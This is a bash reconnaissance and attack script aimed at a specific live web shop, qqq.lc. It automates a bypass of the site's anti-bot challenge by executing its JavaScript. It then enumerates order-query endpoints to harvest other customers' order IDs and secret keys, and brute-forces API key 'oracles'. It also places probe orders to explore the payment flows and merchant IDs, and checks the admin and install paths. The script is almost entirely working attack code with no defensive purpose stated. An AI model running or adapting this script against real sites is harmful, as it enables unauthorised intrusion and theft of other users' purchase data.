#!/bin/bash
# qqq.lc — rainbow root behind chenmYun CC; SUCCESS_CASES + P2
set -u
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'
BASE=https://qqq.lc
OUT=/tmp/qqqlc_out; CK=$OUT/ck.txt; LOG=/tmp/qqqlc_recon.log
rm -rf "$OUT"; mkdir -p "$OUT"; rm -f "$CK"
exec > >(tee "$LOG") 2>&1

# cookie bag
DEFEND=""; TIME=0; PSID=""; MYSID=""; SEC=""

jar_header(){
  local parts=()
  [[ -n "$DEFEND" ]] && parts+=("ccsafe_defend=$DEFEND")
  [[ -n "$TIME" ]] && parts+=("ccsafe_defend_time=$TIME")
  [[ -n "$PSID" ]] && parts+=("PHPSESSID=$PSID")
  [[ -n "$MYSID" ]] && parts+=("mysid=$MYSID")
  [[ -n "$SEC" ]] && parts+=("sec_token_time=$SEC")
  local IFS='; '; echo "${parts[*]-}"
}

c(){
  local hdr; hdr=$(jar_header)
  curl -sk --connect-timeout 10 --max-time 35 -A "$UA" -e "$BASE/" \
    -H "Cookie: $hdr" -D "$OUT/last.hdr" "$@"
}
cj(){ c -H 'X-Requested-With: XMLHttpRequest' "$@"; }

absorb_set_cookies(){
  # parse Set-Cookie from last.hdr
  while IFS= read -r line; do
    case "$line" in
      [Ss]et-[Cc]ookie:*)
        val=${line#*: }; val=${val%%;*}; name=${val%%=*}; v=${val#*=}
        case "$name" in
          PHPSESSID) PSID=$v ;;
          mysid) MYSID=$v ;;
          sec_token_time) SEC=$v ;;
          ccsafe_defend) DEFEND=$v ;;
          ccsafe_defend_time) TIME=$v ;;
        esac
        ;;
    esac
  done < "$OUT/last.hdr"
}

pass_cc(){
  # fetch challenge
  c -o "$OUT/ch.html" -w "ch:%{http_code}\n" "$BASE/"
  absorb_set_cookies
  python3 - <<'PY'
import re,subprocess
h=open('/tmp/qqqlc_out/ch.html',encoding='utf-8',errors='ignore').read()
print('ch_len',len(h),'challenge','安全验证' in h or 'chenmYun' in h)
m=re.search(r"setCookie\('ccsafe_defend',(.+?)\);",h)
if not m:
  open('/tmp/qqqlc_out/val.txt','w').write(''); print('no expr'); raise SystemExit
open('/tmp/qqqlc_out/expr.js','w').write('console.log('+m.group(1)+')')
v=subprocess.check_output(['node','/tmp/qqqlc_out/expr.js'],stderr=subprocess.DEVNULL).decode().strip()
open('/tmp/qqqlc_out/val.txt','w').write(v)
print('val_len',len(v))
PY
  DEFEND=$(cat "$OUT/val.txt")
  TIME=$((TIME+1))
  echo "CC defend set time=$TIME defend=${DEFEND:0:16}..."
  # request with cookies (should 302 when ok)
  c -o "$OUT/pass.html" -w "pass:%{http_code} redir=%{redirect_url} size=%{size_download}\n" "$BASE/"
  absorb_set_cookies
  echo "cookies PSID=$PSID MYSID=$MYSID SEC=$SEC TIME=$TIME"
}

echo '===== CC bypass ====='
pass_cc
# if still challenge body, second pass
if grep -q '安全验证' "$OUT/pass.html" 2>/dev/null || [[ ! -s "$OUT/pass.html" ]]; then
  # follow redirect URL if any empty body 302
  pass_cc
fi

# follow login/index
c -L --max-redirs 5 -o "$OUT/home.html" -w "home:%{http_code} size=%{size_download}\n" "$BASE/"
absorb_set_cookies
c -L --max-redirs 5 -o "$OUT/index.html" -w "index:%{http_code} size=%{size_download}\n" "$BASE/index.php"
c -L --max-redirs 5 -o "$OUT/login.html" -w "login:%{http_code} size=%{size_download}\n" "$BASE/user/login.php"

python3 - <<'PY'
import re
for fn in ['home.html','index.html','login.html','pass.html']:
  try: h=open('/tmp/qqqlc_out/'+fn,encoding='utf-8',errors='ignore').read()
  except: continue
  title=re.search(r'<title>([^<]+)',h)
  print(fn,'len',len(h),'title',title.group(1) if title else None,'challenge','安全验证' in h,'faka','assets/faka' in h)
PY

echo '===== DNS / getcount ====='
getent ahostsv4 qqq.lc || true
cj -X POST "$BASE/ajax.php?act=getcount" | tee "$OUT/getcount.json"; echo

echo '===== SUCCESS qd93 (root) ====='
for data in 1 2 0 00 01 12 88 99 138 150 188 2026 202608; do
  code=$(c "$BASE/?mod=query&data=$data" -o "$OUT/qd_$data.html" -w '%{http_code}')
  python3 - <<PY
import re
h=open('/tmp/qqqlc_out/qd_$data.html',encoding='utf-8',errors='ignore').read()
if '安全验证' in h:
  print(f'data=$data CHALLENGE len={len(h)}'); raise SystemExit
so=re.findall(r"showOrder\((\d+)\s*,\s*'([a-f0-9]{32})'\)", h)
fk=re.findall(r'mod=faka&id=(\d+)&skey=([a-f0-9]{32})', h)
print(f'data=$data HTTP=$code showOrder={len(so)} faka={len(fk)} empty={"没有查询" in h} len={len(h)}')
if so: print(' SO',so[:5]); open('/tmp/qqqlc_out/pairs.jsonl','a').write(__import__('json').dumps({'data':'$data','pairs':so})+'\n')
PY
done

echo '===== SUCCESS 79yj / api ====='
for id in 1 100 1000 5000 10000 50000 59356; do
  echo "search $id => $(c "$BASE/%61pi.php?act=search&id=$id" | head -c 160)"
done
echo "api.php search => $(c "$BASE/api.php?act=search&id=1" -w '|%{http_code}' | head -c 120)"
echo "api.php siteinfo => $(c "$BASE/api.php?act=siteinfo" -w '|%{http_code}' | head -c 120)"

echo '===== SUCCESS YKFAKA ====='
for u in "$BASE/Query.html" "$BASE/Get_Yk_KC.html?gid=1" "$BASE/Query_Km/1"; do
  echo "$u => $(c -o /dev/null -w '%{http_code}' "$u")"
done

echo '===== siteinfo / goods ====='
c "$BASE/%61pi.php?act=siteinfo" | tee "$OUT/siteinfo.json" | head -c 400; echo
c "$BASE/%61pi.php?act=classlist" | tee "$OUT/classlist.json" | head -c 200; echo
c "$BASE/%61pi.php?act=goodslist" | tee "$OUT/goodslist.json" | head -c 400; echo

echo '===== oracles ====='
for k in '' x test 123456 qqq admin; do
  echo "tools [$k] => $(c -G --data-urlencode act=tools --data-urlencode "key=$k" "$BASE/%61pi.php")"
done
echo "token => $(c -G --data-urlencode act=token --data-urlencode key=test "$BASE/%61pi.php")"
echo "clone => $(c -G --data-urlencode act=clone --data-urlencode key=test "$BASE/%61pi.php")"
echo "cron => $(c "$BASE/cron.php?key=test" | head -c 80)"

python3 - <<'PY'
import json,re
raw=open('/tmp/qqqlc_out/siteinfo.json',encoding='utf-8',errors='ignore').read()
try: s=json.loads(raw)
except Exception as e:
  print('siteinfo fail',e, raw[:200]); s={}
print('sitename',s.get('sitename'),'build',s.get('build'),'kfqq',s.get('kfqq'))
an=s.get('anounce') or ''
print('tg',re.findall(r't\.me/[A-Za-z0-9_]+|@[A-Za-z0-9_]{4,}',an)[:12])
print('Taddr',re.findall(r'T[1-9A-HJ-NP-Za-km-z]{33}',an)[:5])
rawg=open('/tmp/qqqlc_out/goodslist.json',encoding='utf-8',errors='ignore').read()
try: g=json.loads(rawg); data=g.get('data') or []
except Exception as e:
  print('goods fail',e); data=[]
print('goods',len(data))
inst=[x for x in data if int(x.get('stock') or 0)>0]
print('instock',len(inst))
cands=sorted(inst,key=lambda z:float(z.get('price') or 0))
for x in cands[:8]:
  print(x.get('tid'),x.get('price'),x.get('stock'),(x.get('name') or '')[:50])
open('/tmp/qqqlc_out/tid.txt','w').write(str(cands[0]['tid']) if cands else '')
PY

TID=$(cat "$OUT/tid.txt" 2>/dev/null || true)
if [[ -z "${TID:-}" ]]; then
  echo 'NO STOCK or goods blocked — try buy page scrape from home'
fi

echo "===== pay tid=${TID:-none} ====="
if [[ -n "${TID:-}" ]]; then
  c "$BASE/?mod=buy&tid=$TID" -o "$OUT/buy.html" -w 'BUY:%{http_code} size:%{size_download}\n'
  python3 - <<'PY'
import re
h=open('/tmp/qqqlc_out/buy.html',encoding='utf-8',errors='ignore').read()
print('buy_challenge','安全验证' in h,'len',len(h))
csrf=re.search(r'csrf_token\s*=\s*[\"\']([^\"\']+)',h)
m=re.search(r"var\s+hashsalt\s*=\s*(.+?);",h)
open('/tmp/qqqlc_out/csrf.txt','w').write(csrf.group(1) if csrf else '')
open('/tmp/qqqlc_out/hs.js','w').write('console.log('+m.group(1)+')' if m else 'console.log("")')
print('csrf',bool(csrf),'hs',bool(m))
PY
  if [[ -s "$OUT/hs.js" ]]; then
    HS=$(node "$OUT/hs.js" 2>/dev/null | tr -d '\r\n')
    CSRF=$(cat "$OUT/csrf.txt")
    INPUT=qqqlc$(date +%H%M%S)
    PAY=$(cj -X POST -H "Referer: $BASE/?mod=buy&tid=$TID" \
      --data-urlencode "tid=$TID" --data-urlencode "inputvalue=$INPUT" --data-urlencode "num=1" \
      --data-urlencode "hashsalt=$HS" --data-urlencode "csrf_token=$CSRF" "$BASE/ajax.php?act=pay")
    echo PAY=$PAY
    echo "$PAY" > "$OUT/pay.json"
    TN=$(python3 -c "import json,sys;print(json.loads(sys.argv[1]).get('trade_no',''))" "$PAY" 2>/dev/null || true)
    echo TN=$TN INPUT=$INPUT
    echo "$TN">"$OUT/tn.txt"; echo "$INPUT">"$OUT/input.txt"
    if [[ -n "$TN" ]]; then
      echo "getshop => $(c "$BASE/other/getshop.php?trade_no=$TN")"
      for typ in usdt alipay wxpay; do
        c "$BASE/other/submit.php?type=$typ&orderid=$TN" -o "$OUT/sub_$typ.html"
        python3 - <<PY
h=open('/tmp/qqqlc_out/sub_$typ.html',encoding='utf-8',errors='ignore').read()
print('submit $typ closed', '已关闭' in h, 'len', len(h))
PY
      done
      c "$BASE/other/qqpay.php?trade_no=$TN" -o "$OUT/qq.html"
      python3 - <<'PY'
import re
h=open('/tmp/qqqlc_out/qq.html',encoding='utf-8',errors='ignore').read()
print('MCHID',re.findall(r'MCHID[^\s<]{0,40}',h)[:4])
PY
      for body in "qq=$TN&type=1&csrf_token=$CSRF" "qq=$INPUT&csrf_token=$CSRF"; do
        code=$(cj -X POST --data "$body" "$BASE/ajax.php?act=query" -w '%{http_code}' -o "$OUT/q.out")
        echo "query HTTP$code $(head -c 200 $OUT/q.out)"
      done
    fi
  fi
fi

echo '===== captcha / paths ====='
CSRF=$(cat "$OUT/csrf.txt" 2>/dev/null || true)
cj -X POST --data "csrf_token=${CSRF:-}" "$BASE/ajax.php?act=captcha" | tee "$OUT/captcha.json"; echo
for u in "$BASE/admin/" "$BASE/install/" "$BASE/toollogs.php" "$BASE/user/login.php" "$BASE/shop/"; do
  echo "$u => $(c -o /dev/null -w '%{http_code}' "$u")"
done

echo '===== RECON DONE ====='
echo "DEFEND_LEN=${#DEFEND} TIME=$TIME PSID=$PSID"
ls -la "$OUT" | head -40
if [[ -f "$OUT/pairs.jsonl" ]]; then echo PAIRS; cat "$OUT/pairs.jsonl"; fi
